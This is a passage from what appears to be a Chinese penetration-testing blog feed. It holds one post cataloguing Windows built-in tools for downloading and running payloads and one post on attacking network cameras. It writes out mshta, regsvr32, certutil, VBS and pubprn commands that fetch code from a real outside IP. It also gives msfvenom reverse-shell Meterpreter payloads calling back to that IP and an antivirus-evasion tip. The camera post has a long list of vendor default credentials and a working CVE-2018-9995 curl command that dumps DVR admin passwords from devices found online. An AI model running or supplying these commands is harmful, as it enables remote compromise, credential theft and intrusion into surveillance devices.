http:&#x2F;&#x2F;23.91.97.29:88&#x2F;evil.hta</span><br><span class="line"></span><br><span class="line">mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)#调用vbs执行命令</span><br><span class="line"></span><br><span class="line">mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im mshta.exe&quot;,0,true);&#125;</span><br><span class="line">#调用JAVASCRIPT执行命令</span><br></pre></td></tr></table></figure><h2 id="rundll32-本地执行dll"><a href="#rundll32-本地执行dll" class="headerlink" title="rundll32(本地执行dll)"></a>rundll32(本地执行dll)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行dll文件，无法远程执行。可能需要配合github项目jsrat或msf能远程。</span><br><span class="line">rundll32 xx.dll start</span><br></pre></td></tr></table></figure><h2 id="regsvr32-exe-远程执行sct调用wscript"><a href="#regsvr32-exe-远程执行sct调用wscript" class="headerlink" title="regsvr32.exe(远程执行sct调用wscript)"></a>regsvr32.exe(远程执行sct调用wscript)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">  progid&#x3D;&quot;TESTING&quot;</span><br><span class="line">  classid&#x3D;&quot;&#123;A1112221-0000-0000-3000-000DA00DABFC&#125;&quot; &gt;</span><br><span class="line">  &lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">      var foo &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">    ]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure><p>上述保存为1.sct，然后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe &#x2F;s &#x2F;u &#x2F;n &#x2F;i:http:&#x2F;&#x2F;23.91.97.29:998&#x2F;1.sct scrobj.dll</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210715142408851.png" alt="image-20210715142408851"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">  description&#x3D;&quot;Component&quot;</span><br><span class="line">  progid&#x3D;&quot;Component.TESTCB&quot;</span><br><span class="line">  version&#x3D;&quot;1.00&quot;</span><br><span class="line">  classid&#x3D;&quot;&#123;20002222-0000-0000-0000-000000000002&#125;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line"> </span><br><span class="line">&lt;public&gt;</span><br><span class="line">  &lt;method name&#x3D;&quot;exec&quot;&gt;</span><br><span class="line">  &lt;&#x2F;method&gt;</span><br><span class="line">&lt;&#x2F;public&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">  &lt;![CDATA[</span><br><span class="line">    function exec()&#123;</span><br><span class="line">      new ActiveXObject(&#39;WScript.Shell&#39;).Run(&#39;calc.exe&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">  ]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure><p>上述保存为2.sct，然后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe &#x2F;s &#x2F;i:http:&#x2F;&#x2F;23.91.97.29:998&#x2F;2.sct scrobj.dll</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var test &#x3D; new ActiveXObject(&quot;Component.TESTCB&quot;);</span><br><span class="line">test.exec()</span><br></pre></td></tr></table></figure><p>将上述保存为2.js并运行，即可调用calc.exe</p><h2 id="certutil-下载，远程执行exe"><a href="#certutil-下载，远程执行exe" class="headerlink" title="certutil(下载，远程执行exe)"></a>certutil(下载，远程执行exe)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe C:\Users\test1\Desktop\a.exe&amp;&amp;C:\Users\test1\Desktop\a.exe#下载并执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe C:\Users\test1\Desktop\a.exe#下载到指定位置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe a.exe#下载到当前目录</span><br><span class="line"></span><br><span class="line">大部分情况av会拦截certutil，可以加上-verifyctl参数，需要高版本windows，使用</span><br><span class="line">certutil -verifyctl -split -f http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe</span><br><span class="line">下载下来会是一串长字符后缀为bin的文件，把后缀修改为原后缀即可</span><br></pre></td></tr></table></figure><h2 id="msbuild-本地执行xml中C"><a href="#msbuild-本地执行xml中C" class="headerlink" title="msbuild(本地执行xml中C#)"></a>msbuild(本地执行xml中C#)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在.NET Framework 4.0中支持了一项新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码，所以上线需要.NET Framework版本大于等于4，通常路径是</span><br><span class="line">&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot;</span><br><span class="line">&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&quot;</span><br><span class="line">生成64位的C#就要64位的运行，不过实验64位的没成功，下面的可以上线</span><br><span class="line">executes shellcode.xml下载地址https:&#x2F;&#x2F;leaderzhang.com&#x2F;upload&#x2F;2019&#x2F;12&#x2F;msbuild-inline-task-master-fb3ec10a4dbe4aaeb38064160ad6c866.zip</span><br><span class="line">参考https:&#x2F;&#x2F;3gstudent.github.io&#x2F;Use-MSBuild-To-Do-More</span><br></pre></td></tr></table></figure><p>生成c# shellcode</p><p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716140522158.png" alt="image-20210716140522158"></p><p>生成的c# shellcode替换executes shellcode.xml中的shellcode</p><p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716141021049.png" alt="image-20210716141021049"></p><p>然后用C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe 1xml执行即可上线</p><p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716141546528.png" alt="image-20210716141546528"></p><h2 id="odbcconf-exe-本地执行dll"><a href="#odbcconf-exe-本地执行dll" class="headerlink" title="odbcconf.exe(本地执行dll)"></a>odbcconf.exe(本地执行dll)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform windows -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;23.91.97.29 lport&#x3D;4491 -f dll &gt; hacker.dll</span><br><span class="line"></span><br><span class="line">odbcconf.exe &#x2F;a &#123;regsvr C:\Users\Administrator\Desktop\hacker.dll&#125;</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716153206198.png" alt="image-20210716153206198"></p><h2 id="CScript-WScript-下载，本地执行vbs"><a href="#CScript-WScript-下载，本地执行vbs" class="headerlink" title="CScript/WScript(下载，本地执行vbs)"></a>CScript/WScript(下载，本地执行vbs)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript和wscript均能执行vbs，区别是wscript执行vbs不会输出版本信息</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716162647980.png" alt="image-20210716162647980"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&#39; Set your settings</span><br><span class="line"></span><br><span class="line">strFileURL &#x3D; &quot;http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe&quot;</span><br><span class="line"></span><br><span class="line">strHDLocation &#x3D; &quot;C:\Users\administrator\Desktop\1.png&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#39; Fetch the file</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP &#x3D; CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line"></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If objXMLHTTP.Status &#x3D; 200 Then</span><br><span class="line"></span><br><span class="line">Set objADOStream &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line"></span><br><span class="line">objADOStream.Open</span><br><span class="line"></span><br><span class="line">objADOStream.Type &#x3D; 1 &#39;adTypeBinary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line"></span><br><span class="line">objADOStream.Position &#x3D; 0&#39;Set the stream position to the start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Set objFSO &#x3D; Createobject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line"></span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line"></span><br><span class="line">Set objFSO &#x3D; Nothing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line"></span><br><span class="line">objADOStream.Close</span><br><span class="line"></span><br><span class="line">Set objADOStream &#x3D; Nothing</span><br><span class="line"></span><br><span class="line">End if</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP &#x3D; Nothing</span><br></pre></td></tr></table></figure><p>保存为down.vbs，然后wscript down.vbs</p><p>上线操作，可以拿来执行.wsh，.vbs，.js等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp  LHOST&#x3D;23.91.97.29 lport&#x3D;4492 -f vbs &gt; msf.vbs</span><br><span class="line"></span><br><span class="line">wscript msf.vbs</span><br></pre></td></tr></table></figure><h2 id="pubprn-vbs-远程执行sct调用wscript"><a href="#pubprn-vbs-远程执行sct调用wscript" class="headerlink" title="pubprn.vbs(远程执行sct调用wscript)"></a>pubprn.vbs(远程执行sct调用wscript)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pubprn.vbs是在Windows 7以上版本存在一个名为pubprn.vbs的微软已签名WSH脚本,可以利用来解析.sct脚本。</span><br><span class="line">cscript &#x2F;b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http:&#x2F;&#x2F;23.91.97.29:998&#x2F;pub.sct</span><br></pre></td></tr></table></figure><p>pub.sct</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    description&#x3D;&quot;Bandit&quot;</span><br><span class="line">    progid&#x3D;&quot;Bandit&quot;</span><br><span class="line">    version&#x3D;&quot;1.00&quot;</span><br><span class="line">    classid&#x3D;&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">    remotable&#x3D;&quot;true&quot;</span><br><span class="line">    &gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">        var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure><h2 id="IEEXEC-有请求但本地没有"><a href="#IEEXEC-有请求但本地没有" class="headerlink" title="IEEXEC(有请求但本地没有)"></a>IEEXEC(有请求但本地没有)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要在C:\Windows\Microsoft.NET\Framework64\v2.0.50727下执行命令</span><br><span class="line">caspol -s off#不知道啥用</span><br><span class="line">IEExec http:&#x2F;&#x2F;site.com&#x2F;files&#x2F;test64.exe#实测会请求，但是用everything没搜到</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这篇其实很水，虽然搜的网上的文章一一尝试的，但大部分文章都是一模一样的，然后还收集的不全，很多没测试成功的也没写上去。最主要的是，现在上线考验的是上线动作的免杀和隐蔽，这些原生的上线方式早已被很多产品标记，动作执行一下就会被弹窗提醒。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 上线方式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>摄像头</title>
      <link href="2021/04/01/%E6%91%84%E5%83%8F%E5%A4%B4/"/>
      <url>2021/04/01/%E6%91%84%E5%83%8F%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h1><h3 id="1-摄像头基础知识"><a href="#1-摄像头基础知识" class="headerlink" title="1.摄像头基础知识"></a>1.摄像头基础知识</h3><h5 id="1-1-网络摄像头类型"><a href="#1-1-网络摄像头类型" class="headerlink" title="1.1 网络摄像头类型"></a>1.1 网络摄像头类型</h5><p>网络摄像头 (IPCam)：由视频服务器和摄像头的集成,通常是 linux 系统, 内置一个 web server,画面实时传输, 一般没有视频存储功能。</p><p>数字视频录像机 (DVR/NVR)：进行图像存储处理, 可录像, 录音, 远程监控等等,大概分为 PC 式和嵌入式, 操作系统不固定,只要处理设备装有处理软件即可, 视频存储</p><p>中央闭路电视 (CCTV)：图像通信系统和 DVR/NVR 结合起来, 通过双绞线、光缆、网络接收图像信号, 监控室里常见</p><p>监控云平台：通过云平台集中管理多个设备</p><h5 id="1-2-常见攻击方法"><a href="#1-2-常见攻击方法" class="headerlink" title="1.2 常见攻击方法"></a>1.2 常见攻击方法</h5><p>根据网络结构中的三个部分云端、手机端、摄像头设备端以及通讯协议可分为四类攻击方法</p><p><strong>针对摄像头设备的攻击：</strong></p><p>1、针对物理设备的攻击：调试接口暴露、固件提取、设备序列号篡改、篡改存储介质、获取普通用户权限、权限提升等；</p><p>2、针对固件的攻击：获取敏感数据、获取硬编码密码、逆向加密算法、获取敏感api接口、ftp或ssh等服务攻击、固件降级等；</p><p>3、针对内存的攻击：获取内存中的敏感数据（如用户名、密码等）、获取加密Key等。</p><p><strong>针对手机端的攻击：</strong></p><p>针对手机端app的攻击相对比较常见，而结合摄像头的特殊性，主要可以从以下几个方面入手。</p><p>1、静态反编译：对APP进行脱壳、使用反编译工具获取源码、本地敏感数据存储、logcat日志、webview风险测试等；</p><p>2、通信安全：中间人攻击、访问控制是否合理、数据加密强度等。</p><p><strong>针对云端的攻击：</strong></p><p>云服务端面临的风险和常规的应用服务器类似，简单列举几个。</p><p>1、web应用安全：用户注册的各种问题、任意用户注册、用户枚举、验证码缺陷、各种越权、密码复杂度、单点登录、密码修改等等。</p><p>2、服务安全：针对服务器开放的各种服务存在的缺陷进行攻击，如ftp、ssh、mysql等各种弱口令，针对操作系统的各种Nday和0day等；</p><p>3、其他：各种C段、子域名等等，还可以先打入摄像头公司内部办公网再觊觎服务器，DDOS打乱对方部署也是一种思路。</p><p><strong>针对协议的攻击：</strong></p><p>除了摄像头设备、手机端、云服这三个重要节点外，三者之间的通讯安全也非常关键。</p><p>1、APP与云端一般通过HTTP、HTTPS通信，分析中应判断通信流量是否加密，可否抓包劫持通信数据;</p><p>2、设备与云端一般采用MQTT、XMPP、CoAP等协议通信，也会使用HTTP、HTTPS通信,部分厂家的设备会使用私有协议进行通讯，例如京东、小米、broadlink等;</p><p>3、APP与设备之间通信一般利用短距离无线网络进行通信，如ZigBee、Wi-Fi以及蓝牙等。</p><h5 id="1-3-常见弱口令"><a href="#1-3-常见弱口令" class="headerlink" title="1.3 常见弱口令"></a>1.3 常见弱口令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">海康威视(hikvision):admin&#x2F;123456</span><br><span class="line"></span><br><span class="line">大华网络摄像机(WEb SERVICE):admin&#x2F;admin 管理权限</span><br><span class="line">default&#x2F;user 用户默认登录账号</span><br><span class="line">888888&#x2F;admin</span><br><span class="line">666666&#x2F;user</span><br><span class="line"></span><br><span class="line">cctv摄像机(JAWS&#x2F;1.0):admin&#x2F;空</span><br><span class="line">root&#x2F;juantech 系统口令</span><br><span class="line"></span><br><span class="line">SQ-WEBCAM摄像机(SQ-WEBCAM):admin&#x2F;admin</span><br><span class="line"></span><br><span class="line">ACTi: admin&#x2F;123456 Admin&#x2F;123456</span><br><span class="line"> </span><br><span class="line">AmericanDynamics: admin&#x2F;admin or admin&#x2F;9999</span><br><span class="line"> </span><br><span class="line">ArecontVision: none</span><br><span class="line"> </span><br><span class="line">Avigilon: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Axis: traditionally root&#x2F;pass, newAxis cameras require password creation during first login</span><br><span class="line"> </span><br><span class="line">Basler: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Bosch: none</span><br><span class="line"> </span><br><span class="line">Brickcom: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Canon: root&#x2F;camera</span><br><span class="line"> </span><br><span class="line">Cisco: Nodefault password, requires creation during first login</span><br><span class="line"> </span><br><span class="line">Dahua: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">DigitalWatchdog: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">DRS: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">DVTel: Admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">DynaColor: Admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">FLIR: admin&#x2F;fliradmin</span><br><span class="line"> </span><br><span class="line">Foscam: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">GeoVision: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Grandstream: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Hikvision: admin&#x2F;12345</span><br><span class="line"> </span><br><span class="line">Honeywell: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">IQinVision: root&#x2F;system</span><br><span class="line"> </span><br><span class="line">IPX-DDK: root&#x2F;admin orroot&#x2F;Admin\</span><br><span class="line"> </span><br><span class="line">JVC: admin&#x2F;jvc</span><br><span class="line"> </span><br><span class="line">March: Networks: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">Mobotix: admin&#x2F;meinsm</span><br><span class="line"> </span><br><span class="line">Panasonic: admin&#x2F;12345</span><br><span class="line"> </span><br><span class="line">PelcoSarix: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Pixord: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">SamsungElectronics: root&#x2F;root or admin&#x2F;4321</span><br><span class="line"> </span><br><span class="line">SamsungTechwin (old): admin&#x2F;1111111</span><br><span class="line"> </span><br><span class="line">Samsung(new): admin&#x2F;4321</span><br><span class="line"> </span><br><span class="line">Sanyo: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Scallop: admin&#x2F;password</span><br><span class="line"> </span><br><span class="line">Sentry360(mini): admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">Sentry360(pro): none</span><br><span class="line"> </span><br><span class="line">Sony: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Speco: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">Stardot: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Starvedia: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">Trendnet: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Toshiba: root&#x2F;ikwd</span><br><span class="line"> </span><br><span class="line">VideoIQ: supervisor&#x2F;supervisor</span><br><span class="line"> </span><br><span class="line">Vivotek: root&#x2F;</span><br><span class="line"> </span><br><span class="line">Ubiquiti: ubnt&#x2F;ubnt</span><br><span class="line"> </span><br><span class="line">Wodsee: admin&#x2F;</span><br></pre></td></tr></table></figure><h3 id="2-摄像头漏洞"><a href="#2-摄像头漏洞" class="headerlink" title="2. 摄像头漏洞"></a>2. 摄像头漏洞</h3><h5 id="2-1-DVR登录绕过-CVE-2018-9995"><a href="#2-1-DVR登录绕过-CVE-2018-9995" class="headerlink" title="2.1 DVR登录绕过 CVE-2018-9995"></a>2.1 DVR登录绕过 CVE-2018-9995</h5><p><strong>公布时间</strong>：2018年4月</p><p><strong>影响版本</strong>：tbk、NovoCeNova、QSee、Pulnix、XVR 5 in 1、Securus、Night OWL</p><p><strong>漏洞位置</strong>：</p><p><strong>漏洞描述</strong>：DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。最初由阿根廷研究员发现，通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，DVR将以明文形式响应设备的管理员凭证。</p><p><strong>修复建议</strong>：</p><p><strong>漏洞复现</strong>：</p><p>2020年2月20日。直接用fofa搜“login.rsp”即可，感觉还是挺多的，随便找了一个就存在该漏洞。</p><p>利用有两种方式。第一种是直接用curl命令获取帐密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http:&#x2F;&#x2F;ip:port&#x2F;device.rsp?opt&#x3D;user&amp;cmd&#x3D;list&quot; -H &quot;Cookie: uid&#x3D;admin&quot;</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220145757392.png" alt="image-20200220145757392"></p><p>第二种是添加cookie，然后刷新访问，注意不要带login.rsp。另外要看监控画面需要安装插件。</p><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150235066.png" alt="image-20200220150235066"></p><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150323351.png" alt="image-20200220150323351"></p><h5 id="2-2-JAWS登录绕过"><a href="#2-2-JAWS登录绕过" class="headerlink" title="2.2 JAWS登录绕过"></a>2.2 JAWS登录绕过</h5><p><strong>公布时间</strong>：</p><p><strong>影响版本</strong>：app=”JAWS/1.0”</p><p><strong>漏洞位置</strong>：</p><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220153731462.png" alt="image-20200220153731462"><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220160326388.png" 